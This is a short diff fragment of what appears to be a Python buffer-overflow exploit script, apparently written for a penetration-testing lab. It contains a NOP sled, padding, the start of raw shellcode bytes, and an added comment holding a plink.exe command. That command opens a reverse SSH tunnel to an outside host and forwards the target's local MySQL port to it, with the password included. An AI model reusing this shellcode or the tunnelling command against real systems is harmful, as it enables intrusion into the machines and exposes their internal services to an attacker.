@@ -30,6 +30,7 @@ try:
     offset = b"C" * 4
     nops = b"\x90" * 10
     buffer = b"D" * (1500 -788)
+    # cmd.exe /c echo y | plink.exe -ssh -l kali - pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
     shellcode = (
             b"\xb8\xdb\xc3\x9d\x44\xda\xd6\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
             b"\x52\x31\x43\x12\x83\xeb\xfc\x03\x98\xcd\x7f\xb1\xe2\x3a\xfd"
